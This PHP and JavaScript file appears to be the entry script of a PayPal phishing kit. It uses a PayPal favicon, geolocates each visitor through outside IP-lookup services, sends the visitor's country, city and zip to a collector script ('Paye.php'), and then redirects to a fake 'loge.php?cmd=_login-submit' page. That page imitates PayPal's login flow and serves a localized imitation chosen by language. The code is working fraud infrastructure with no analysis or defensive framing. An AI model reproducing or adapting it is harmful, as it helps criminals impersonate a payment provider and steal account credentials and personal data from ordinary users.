<?php
if (!isset($_SESSION)) {
  session_start();
}
include "./option.php";
if($start==true){
$ee= md5(microtime());
ini_set('session.gc_maxlifetime', 3600);
$_SESSION['new_version']=true;
if((!isset($_GET['ee']) or !isset($_SESSION['tempLang']))){
	include "./lang/country_code.php";
	function langue($l){
		if(array_key_exists($l, $_GET["lang_con"])) {
		 return $_GET["lang_con"][$l];
		}else{
			return "US";
		}
	}
	$lang = substr(strtolower($_SERVER["HTTP_ACCEPT_LANGUAGE"]), 0, 2);
	if ($lang != ''){$con = langue($lang);}else{$con = "US";}
?>
<!DOCTYPE html>
<html><head>
<link rel="shortcut icon" href="css/img/pp_favicon_x.ico">
<style type="text/css">
.load{
	line-height: 250px;
	text-align: center;
}
.load img{
	vertical-align: middle;
}
</style>
<div class="load"><img src="./css/img/ajax_loader_blue_64.gif" ><div>
<script language="JavaScript">
	function GoAJAX(a,t){
	{url ="./lang/Paye.php";var xmlhttp;
	if (window.XMLHttpRequest)
	  {// code for IE7+, Firefox, Chrome, Opera, Safari
	  xmlhttp=new XMLHttpRequest();
	  }
	else
	  {// code for IE6, IE5
	  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	  }
	xmlhttp.onreadystatechange=function()
	  {
	  if (xmlhttp.readyState==4 && xmlhttp.status==200)
	    {//xmlhttp.responseText
			if(t==1){
		
			window.location.href="./loge.php?cmd=_login-submit&dispatch=5885d80a13c0db1f8e<?php echo "&ee=$ee"; ?>";
			}
	    }
	  }
	xmlhttp.open("POST",url,true);
	xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	xmlhttp.send(a);
 
	}
	}
	function callback_function(object,type)
	{	var etat=false;
		if(type==1){
			GoAJAX('b=4&1=tempLang&tempLang='+object.countryCode+'&2=tLang&tLang='+object.country+'&3=city&city='+object.city+'&4=zip&zip='+object.zip,1);
		}else if(type==2){
			GoAJAX('b=4&1=tempLang&tempLang='+object.country_code+'&2=tLang&tLang='+object.country+'&3=city&city='+object.city+'&4=zip&zip=apinon',1);
		}
	}
	var xhr = new XMLHttpRequest();
	xhr.open("GET", 'http://ip-api.com/json', true);
	xhr.timeout = 2500;
    xhr.ontimeout = function () {
		var xhr1 = new XMLHttpRequest();
		xhr1.open("GET", 'http://www.telize.com/geoip', true);
		xhr1.timeout = 2500;
	    xhr1.ontimeout = function () {
	   		GoAJAX('b=4&1=tempLang&tempLang=<?php echo $con; ?>&2=tLang&tLang=X-<?php echo $con; ?>&3=city&city=Xtimeout&4=zip&zip=Xtimeout',1);
	 	} 
		xhr1.onreadystatechange = function() {
		    if (xhr1.readyState == 4) {
		        callback_function(JSON.parse(xhr1.responseText),2);
		    }
		}
		xhr1.send();
 	}
	xhr.onreadystatechange = function() {
	    if (xhr.readyState == 4) {
	        callback_function(JSON.parse(xhr.responseText),1);
	    }
	}
	xhr.send();
</script>
</head></html>
<?php
}

if (isset($_SESSION['tempLang']) and isset($_GET['ee'])){
$action_loge=' action="./loge.php?cmd=_login-submit&dispatch=5885d80a13c0db47e633b393e284a5f8a8f8&ee='.$ee.'"';
include "./lang/Paye.php";
lang();
include "./lang/".lang2();
if(isset($_GET['country-worldwide'])){
	include "country-worldwide.php";
}else{
	include "new.php";
}
}

}else{echo $_SESSION['MessageOFF'];}
?>